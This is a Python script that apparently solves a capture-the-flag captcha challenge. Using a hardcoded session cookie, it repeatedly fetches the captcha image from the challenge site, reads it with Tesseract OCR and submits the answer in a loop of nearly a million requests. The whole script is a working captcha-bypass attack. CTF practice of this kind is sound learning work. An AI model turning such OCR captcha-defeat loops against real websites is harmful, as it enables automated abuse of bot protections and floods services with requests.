import base64
import io
import time
import requests
from bs4 import BeautifulSoup
from PIL import Image
import pytesseract

test_headers = {}
test_headers["Cookie"] = "PHPSESSID=cm8c9uqumiakdk2k3plblj24o3; 926835342a210d84823968c8328cc3c8=6a1941a8e10bb5cbd77de0fd19bcebae"

request_url = 'https://captcha1.uctf.ir/'  # Replace with the actual URL you want to use
# Perform the process 100 times
for _ in range(999999):

    if _ == 0:
        # URL to connect to
        payload = {'captcha': "1"}  # Modify this payload as needed
        post_response = requests.post(request_url, data=payload, headers=test_headers)
        
        init_header = post_response.headers

    elif _ == 999998:
        _ = 1
        
    else:
        # Step 2: Parse the HTML content to find the image tag
        soup = BeautifulSoup(post_response.text, 'html.parser')
        img_tag = soup.find('img')

        # Check if an image tag was found
        if img_tag:
            # Step 3: Extract the base64-encoded image data from the img tag
            img_data = img_tag.get('src').split(',')[1]

            # Step 4: Perform OCR on the image
            img_bytes = bytes(img_data, 'utf-8')
            image = Image.open(io.BytesIO(base64.b64decode(img_bytes)))
            ocr_text = pytesseract.image_to_string(image, config='--psm 10 --oem 3 -c tessedit_char_whitelist=abcdefghijklmnopqrstuvwxyz0123456789')

            # Step 5: Submit back to the URL (assuming you need to POST the OCR result)
            payload = {'captcha': ocr_text}  # Modify this payload as needed
            post_response = requests.post(request_url, data=payload, headers=test_headers)

            # Step 6: Wait for the response and handle it as needed
            if post_response.status_code == 200:
                print(f"OCR result successfully submitted: {ocr_text}")
                soup = BeautifulSoup(post_response.text, 'html.parser')
                h4_tag = soup.find_all('h4')
                print(f"Response Content: {h4_tag}")
            else:
                print(f"Failed to submit OCR result. Status code: {post_response.status_code}")
                
        else:
            print("No image found in the HTML content")

            # Optional: Add a delay between iterations to avoid overloading the server
            #time.sleep(1)  # Adjust the delay as needed
